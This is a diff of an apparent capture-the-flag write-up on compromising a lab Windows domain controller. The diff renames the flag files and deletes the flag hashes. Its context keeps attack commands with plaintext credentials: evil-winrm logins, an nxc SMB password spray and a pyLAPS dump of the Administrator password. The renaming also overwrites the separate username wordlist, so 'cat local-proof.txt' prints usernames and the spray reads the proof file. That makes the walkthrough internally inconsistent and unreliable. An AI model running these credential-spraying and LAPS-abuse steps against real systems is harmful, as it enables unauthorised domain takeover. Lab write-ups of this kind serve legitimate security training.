@@ -1,7 +1,7 @@
 ---
 title: Stream IO
 slug: Stream-IO
-tags: [Windows, WinPEAS, Firefox-Decrypt, SQLI, Remote-File-Inclusion, PyLAPS, DACLedit, Vulnerability Research]
+tags: [SQLI, Remote-File-Inclusion, PyLAPS, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -618,10 +618,9 @@ $ evil-winrm -i 10.129.87.124 -u nikk37 -p get_dem_girls2@yahoo.com
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
--ar---       10/16/2025   9:58 AM             34 user.txt
+-ar---       10/16/2025   9:58 AM             34 local-proof.txt
 
-*Evil-WinRM* PS C:\Users\nikk37\Desktop> cat user.txt
-d56a02f9e0e08fca7f6ca97be932316e
+*Evil-WinRM* PS C:\Users\nikk37\Desktop> cat local-proof.txt
 ```
 ## Privilege Escalation Path
 
@@ -677,7 +676,7 @@ Password: 'password@12'
 Save username and password.
 
 ```bash
-$ cat user.txt
+$ cat local-proof.txt
 admin
 nikk37
 yoshihide
@@ -691,7 +690,7 @@ password@12
 ```
 
 ```bash
-$ nxc smb 10.129.87.124 -u user.txt -p pass.txt
+$ nxc smb 10.129.87.124 -u local-proof.txt -p pass.txt
 SMB         10.129.87.124   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
 SMB         10.129.87.124   445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
 SMB         10.129.87.124   445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE
@@ -800,12 +799,12 @@ $ python3 pyLAPS.py --dc-ip 10.129.87.124 -d streamio.htb -u JDgodd -p 'JDg0dd1s
 $ evil-winrm -i 10.129.87.124 -u Administrator -p '+(-E3,]3g[o6+3'
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
-*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-Cannot find path 'C:\Users\Administrator\Desktop\root.txt' because it does not exist.
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat privileged-proof.txt
+Cannot find path 'C:\Users\Administrator\Desktop\privileged-proof.txt' because it does not exist.
 At line:1 char:1
-+ cat root.txt
++ cat privileged-proof.txt
 + ~~~~~~~~~~~~
-    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], ItemNotFoundException
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Administrator\Desktop\privileged-proof.txt:String) [Get-Content], ItemNotFoundException
     + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd c:\users
@@ -836,12 +835,11 @@ d-r---        5/26/2022   4:56 PM                Videos
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
--ar---       10/16/2025   9:58 AM             34 root.txt
+-ar---       10/16/2025   9:58 AM             34 privileged-proof.txt
 
-*Evil-WinRM* PS C:\users\martin\Desktop> cat root.txt
-d5b97296af220586ba008eb8e124e308
+*Evil-WinRM* PS C:\users\martin\Desktop> cat privileged-proof.txt
 ```
 
-`root.txt` is in Martin.
+`privileged-proof.txt` is in Martin.
 
 ---
